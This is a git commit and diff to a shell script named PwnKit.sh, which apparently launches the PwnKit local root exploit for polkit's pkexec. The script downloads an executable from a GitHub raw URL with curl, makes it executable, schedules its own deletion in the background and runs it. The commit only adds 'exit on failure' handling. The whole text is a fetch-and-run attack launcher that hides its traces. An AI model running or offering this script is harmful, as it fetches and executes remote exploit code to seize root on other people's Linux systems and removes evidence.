445c73f7e81ca89528f3e15148a1a747fb9d65db
Oliver Lyak ly4k <53348818+ly4k@users.noreply.github.com>
2022-01-27 21:03:46 +0100

    added exit on failure

--- PwnKit.sh
+++ PwnKit.sh
@@ -1,4 +1,4 @@
-curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit 
-chmod +x ./PwnKit
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
+chmod +x ./PwnKit || exit
 (sleep 1 && rm ./PwnKit & )
 ./PwnKit
